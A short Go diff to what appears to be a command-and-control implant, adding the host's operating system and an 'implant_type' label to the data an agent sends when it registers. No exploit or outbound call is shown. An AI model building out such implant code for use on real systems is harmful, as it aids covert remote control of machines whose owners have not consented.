@@ -62,6 +62,8 @@ func getLocalIP() string {
 func (agent *Agent) Register() error {
     data := map[string]string{
         "agent_id": agent.LocalIP,
+		"os": runtime.GOOS,
+		"implant_type": "Go",
     }
 
     jsonData, err := json.Marshal(data)
